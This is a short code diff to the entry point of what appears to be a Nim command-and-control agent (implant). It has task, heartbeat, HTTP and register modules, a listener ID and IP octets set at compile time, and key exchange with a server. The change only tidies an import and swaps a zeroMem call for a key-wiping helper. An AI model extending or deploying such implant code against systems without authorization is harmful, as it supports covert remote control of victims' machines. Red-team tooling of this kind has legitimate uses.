@@ -3,7 +3,6 @@ import winim
 
 import core/[task, taskresult, heartbeat, http, register]
 import ../../common/[types, utils, crypto]
-import sugar
 
 const ListenerUuid {.strdefine.}: string = ""
 const Octet1 {.intdefine.}: int = 0
@@ -36,7 +35,7 @@ proc main() =
     # Create agent configuration
     var config: AgentConfig
     try: 
-        let agentKeyPair = generateKeyPair() 
+        var agentKeyPair = generateKeyPair() 
         let serverPublicKey = decode(ServerPublicKey).toKey() 
 
         config = AgentConfig(
@@ -49,8 +48,8 @@ proc main() =
             agentPublicKey: agentKeyPair.publicKey
         )
 
-        # Clean up agent's private key from memory
-        zeroMem(agentKeyPair.privateKey[0].addr, sizeof(PrivateKey))
+        # Cleanup agent's secret key
+        wipeKey(agentKeyPair.privateKey)
 
     except CatchableError as err:
         echo "[-] " & err.msg
